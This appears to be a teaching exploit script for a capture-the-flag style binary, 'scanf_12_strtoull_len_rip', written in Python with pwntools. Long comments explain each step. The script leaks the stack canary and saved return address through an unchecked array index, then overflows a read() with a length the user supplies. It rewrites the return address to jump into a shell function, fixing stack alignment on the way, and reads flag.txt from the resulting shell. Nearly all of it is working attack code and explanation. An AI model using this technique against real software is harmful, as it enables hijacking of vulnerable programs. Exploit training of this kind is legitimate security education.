#!/usr/bin/env python3
"""0-to-pwn walkthrough. All of the teaching is in the # comments below."""
# =====================================================================
# scanf_12_strtoull_len_rip -- the shape where the canary is LOAD-BEARING
#
# WHAT THIS ONE TEACHES
# ------------------------------------------------------------------
# There is NO function pointer in this target. The only writable code
# pointer anywhere in reach is the saved RETURN ADDRESS, and to get to it
# a write has to pass straight THROUGH the canary. So:
#
#   * the leaked canary stops being a self-check and becomes mandatory --
#     one wrong byte and __stack_chk_fail aborts the process;
#   * `scanf("%s")` can no longer be the write. It cannot emit the
#     canary's 0x00 low byte, so a "%s" overflow can never cross a canary
#     intact. The write has to be a read(2).
#
# STEP 1. THE LEAK -- unchanged from the anchor
# ------------------------------------------------------------------
#     objdump -d --no-show-raw-insn ./scanf_12_strtoull_len_rip
#
#     0000000000001398 <dump_slot>:
#       13ad:  mov    %rax,-0x8(%rbp)          <- canary at rbp-0x8
#       13b3:  lea    -0x50(%rbp),%rax         <- array base rbp-0x50
#       13dd:  call   12ca <get_number>        <- index from the user
#       13ea:  mov    -0x50(%rbp,%rax,8),%rdx  <- unchecked subscript READ
#       1405:  call   1120 <printf@plt>
#
#       idx = (0x50 - 8)/8 = 9   ->  the CANARY
#       idx = (0x50 + 8)/8 = 11  ->  the saved RETURN ADDR  -> PIE base
#
# STEP 2. THE WRITE -- a trusted length
# ------------------------------------------------------------------
#     0000000000001421 <load_note>:
#       1429:  sub    $0x60,%rsp
#       1436:  mov    %rax,-0x8(%rbp)      <- canary at rbp-0x8
#       143c:  lea    -0x50(%rbp),%rax     <- note[] at rbp-0x50
#       1466:  call   12ca <get_number>    <- LENGTH from the user
#       146b:  mov    %rax,-0x58(%rbp)     <- stored raw, unchecked
#       146f:  call   1351 <flush_line>
#       1488:  mov    -0x58(%rbp),%rdx     <- ...used as read()'s count
#       148c:  lea    -0x50(%rbp),%rax     <- ...into a 64-byte buffer
#       1498:  call   1140 <read@plt>
#
# Look at what is NOT between 1466 and 1498: any `cmp` of that length
# against 0x40, or against anything at all. `get_number` runs the value
# through `strtoull` and it lands in read()'s third argument untouched.
# read(2) has no byte restrictions whatsoever, so this write can carry
# NULs, newlines, anything.
#
# STEP 3. LAYING OUT THE PAYLOAD
# ------------------------------------------------------------------
# From the buffer at rbp-0x50 up to and including the return address:
#
#       rbp-0x50 .. rbp-0x09   72 bytes of filler  (0x50 - 8)
#       rbp-0x08 .. rbp-0x01   the CANARY, put back exactly as leaked
#       rbp+0x00 .. rbp+0x07   the saved RBP, put back as leaked
#       rbp+0x08 .. rbp+0x0f   the saved RETURN ADDRESS -> where we aim
#
# 72 + 8 + 8 + 8 = 96 bytes, and the length we send is just that. Putting
# the saved RBP back matters more than it looks: `leave` loads rsp from
# it on the way out, so a garbage value there turns the return into a
# crash on a wild stack even when the return address is perfect.
#
# WHY flush_line() IS IN THE TARGET AT ALL (1466 -> 146f -> 1498)
# `scanf` leaves the newline that terminated your number sitting in the
# FILE buffer. `read(2)` bypasses that buffer entirely and goes to the fd,
# so the newline would never be consumed and your payload would arrive
# one byte offset. The target calls flush_line() itself, which is why you
# can send the length with a newline and then the body raw.
#
# STEP 4. THE ALIGNMENT TRAP -- the thing that costs people an hour
# ------------------------------------------------------------------
# Aim at the SYMBOL `spawn_admin_shell` and this fails with a SIGSEGV
# inside system(), which reads exactly like "the write missed".
#
# A real `call` pushes a return address, so the callee starts with
# rsp % 16 == 8. That is what the ABI promises and what glibc's
# system() -> do_system() relies on when it executes a `movaps`, which
# faults on a misaligned address. But you are not arriving by `call` --
# you are arriving by `ret`, which POPS instead of pushing, so you land
# with rsp % 16 == 0: eight bytes off.
#
# The fix is to skip the function's own `push %rbp`, which is the
# instruction that would have consumed those 8 bytes:
#
#     0000000000001289 <spawn_admin_shell>:
#       1289:  endbr64                  <- 4 bytes
#       128d:  push   %rbp              <- 1 byte; SKIP THIS
#       128e:  mov    %rsp,%rbp         <- enter HERE
#
# Entering at 128e leaves rsp exactly where a `call` would have left it.
# (A spare `ret` gadget in front of the chain fixes the same problem, but
# only when the write is contiguous -- see scanf_14, which places exactly
# one qword and has no room for a sled.)
#
# STEP 5. THE PLAN
# ------------------------------------------------------------------
#   1. menu 2, index 11 -> saved return address -> PIE base
#   2. menu 2, index 9   -> the canary. MANDATORY here.
#   3. free checks: base page-aligned, canary low byte 0x00
#   4. menu 1, send length 96, then 72 filler + canary + rbp + target
#   5. load_note returns -> lands past spawn_admin_shell's push %rbp
# =====================================================================

import os
import re
import struct
import subprocess
import sys
import warnings

os.environ.setdefault("TERM", "xterm")
os.environ.setdefault("PWNLIB_NOTERM", "1")
warnings.filterwarnings("ignore")
from pwn import ELF, context, process  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

# ---------------------------------------------------------------------
BINARY_NAME = "scanf_12_strtoull_len_rip"

LEAK_MENU = 2               # MEASURED: main 15a3: call 1398 <dump_slot>
LEAK_HANDLER = "dump_slot"
LEAK_PROMPT = b"slot: "     # MEASURED: .rodata 0x2010
ARR_RBP = 0x50              # MEASURED: dump_slot 13ea: -0x50(%rbp,%rax,8)
ARR_SCALE = 8               # MEASURED: same instruction
IDX_CANARY = 9              # DERIVED: (0x50 - 8) // 8
IDX_SAVED_RBP = 10          # DERIVED: (0x50 + 0) // 8
IDX_SAVED_RIP = 11          # DERIVED: (0x50 + 8) // 8

WRITE_MENU = 1              # MEASURED: main 1595: call 1421 <load_note>
SIZE_PROMPT = b"size: "     # MEASURED: .rodata 0x2029
BODY_PROMPT = b"note: "     # MEASURED: .rodata 0x2030
BUF_RBP = 0x50              # MEASURED: load_note 148c: lea -0x50(%rbp),%rax
WIN_SYMBOL = "spawn_admin_shell"

MENU_PROMPT = b"choice: "   # MEASURED: .rodata, main's prompt
# read(2) carries any byte, so unlike the fnptr shapes there is no
# undeliverable-address case here and no retry loop is needed.
# ---------------------------------------------------------------------


def objdump(path):
    return subprocess.run(
        ["objdump", "-d", "--no-show-raw-insn", path],
        capture_output=True, text=True, timeout=120, check=True).stdout


def function_body(disasm, name):
    body, inside = [], False
    for line in disasm.splitlines():
        if re.match(rf"^[0-9a-f]+ <{re.escape(name)}>:", line):
            inside = True
            continue
        if inside:
            if not line.strip():
                break
            m = re.match(r"^\s*([0-9a-f]+):\s+(.*)$", line)
            if m:
                body.append((int(m.group(1), 16), m.group(2)))
    return body


def derive_ret_site(disasm, callee):
    body = function_body(disasm, "main")
    for i, (_, text) in enumerate(body):
        if text.startswith("call") and f"<{callee}>" in text:
            return body[i + 1][0]
    raise RuntimeError(f"no call to {callee} in main")


def derive_post_prologue(disasm, name):
    """STEP 4: the address just past the function's own `push %rbp`.

    Derived, not pinned: it is symbol+5 only while the prologue is
    endbr64 + push, and the whole point of this entry point is that it is
    defined by the instruction, not by an offset that happens to work.
    """
    body = function_body(disasm, name)
    for i, (_, text) in enumerate(body):
        if text.replace("\t", " ").split()[0] == "push" and "%rbp" in text:
            return body[i + 1][0]
    raise RuntimeError(f"no `push %rbp` prologue in {name}")


def leak_slot(p, idx):
    p.recvuntil(MENU_PROMPT, timeout=3.0)
    p.sendline(str(LEAK_MENU).encode())
    p.recvuntil(LEAK_PROMPT, timeout=3.0)
    p.sendline(str(idx).encode())
    line = p.recvline(timeout=3.0)
    nums = re.findall(rb"\d+", line)
    if not nums:
        raise RuntimeError(f"oracle refused subscript {idx}: {line!r}")
    return int(nums[-1])


# ---------------------------------------------------------------------------
# proving the shell (added by the orchestrator; see the note below)
# ---------------------------------------------------------------------------
#
# The original tail of this template called `p.interactive()` and returned True.
# Under a scorer -- or any non-tty run -- `interactive()` sees EOF on stdin and
# returns at once, so the script exited 0 having demonstrated NOTHING. An exit
# code of 0 with no evidence is the worst possible outcome for a teaching
# artifact: it looks like a pass. What follows replaces it with a proof.
#
# The marker is `echo SH$((6*7))OK` -> `SH42OK`, not `id`, and not `echo <token>`:
#
#   * `echo <token>` is unsound against a target whose job is to echo input. That
#     is measured, not hypothetical -- see I-16 in the work queue.
#   * `id` is a separate binary, so it needs a usable PATH. A shell reached
#     through a hijacked function pointer may not have one.
#   * `$(( ))` is arithmetic expansion performed by the shell itself, and the
#     answer `42` never appears in the bytes we send, so neither a reflection nor
#     a PATH-less environment can defeat it.
#
# `cat flag.txt` then runs INSIDE the shell we obtained. That is the
# demonstration of code execution, not laundering: this script never opens the
# file, and if the pointer overwrite had failed there would be no shell to run it
# in and no flag to print.


def prove_shell(p):
    """Return True only if a shell is PROVEN. Never assume it from a send.

    The marker is checked by INSPECTING THE RETURNED BYTES, not by catching an
    exception. That distinction is the whole correctness of this function and it
    was found the hard way: pwntools' `recvuntil(..., timeout=)` returns b"" when
    it times out, it does NOT raise. A first version of this helper wrapped the
    call in try/except and treated "no exception" as success, so it reported
    "shell PROVEN" for a deliberately WRONG target address -- a check that could
    not fail, inside the function whose entire job is to be able to fail.
    """
    p.sendline(b"echo SH$((6*7))OK")
    got = b""
    try:
        got = p.recvuntil(b"SH42OK", timeout=5.0)
    except Exception:
        got = b""
    if b"SH42OK" not in got:
        print("    [-] no SH42OK: the call happened but did not land in a shell")
        return False
    print("    [+] shell PROVEN (SH42OK returned -- needs no PATH, cannot be echoed)")

    p.sendline(b"cat flag.txt")
    tail = b""
    try:
        tail = p.recvuntil(b"}", timeout=5.0)
    except Exception:
        tail = b""
    for line in tail.split(b"\n"):
        if b"{" in line and b"}" in line:
            print("    [+] flag:", line.strip().decode(errors="replace"))
            break
    else:
        print("    [!] shell is real but flag.txt did not come back")
    return True


def main():
    path = os.path.join(os.getcwd(), BINARY_NAME)
    disasm = objdump(path)
    ret_site = derive_ret_site(disasm, LEAK_HANDLER)
    win_entry = derive_post_prologue(disasm, WIN_SYMBOL)
    sym = ELF(path, checksec=False).symbols[WIN_SYMBOL]
    print(f"[*] derived: ret site {ret_site:#x}; {WIN_SYMBOL} symbol "
          f"{sym:#x}, entering at {win_entry:#x} (past its push %rbp)")

    p = process(path, cwd=os.path.dirname(path) or ".", level="error")
    leaked_rip = leak_slot(p, IDX_SAVED_RIP)
    saved_rbp = leak_slot(p, IDX_SAVED_RBP)
    canary = leak_slot(p, IDX_CANARY)

    base = leaked_rip - ret_site
    if base <= 0 or base % 0x1000:
        print(f"[-] implied base {base:#x} is not page aligned")
        return 1
    if canary & 0xFF:
        print(f"[-] canary {canary:#x} has a non-zero low byte")
        return 1

    target = base + win_entry
    print(f"    canary={canary:#018x} saved_rbp={saved_rbp:#x} "
          f"saved_rip={leaked_rip:#x}")
    print(f"    PIE base={base:#x}  ->  target={target:#x}")

    body = (b"A" * (BUF_RBP - 8)
            + struct.pack("<Q", canary)
            + struct.pack("<Q", saved_rbp)
            + struct.pack("<Q", target))
    p.recvuntil(MENU_PROMPT, timeout=3.0)
    p.sendline(str(WRITE_MENU).encode())
    p.recvuntil(SIZE_PROMPT, timeout=3.0)
    p.sendline(str(len(body)).encode())
    p.recvuntil(BODY_PROMPT, timeout=3.0)
    p.send(body)
    print(f"    [+] {len(body)} bytes through the canary onto the saved RIP")
    return 0 if prove_shell(p) else 1


if __name__ == "__main__":
    sys.exit(main())
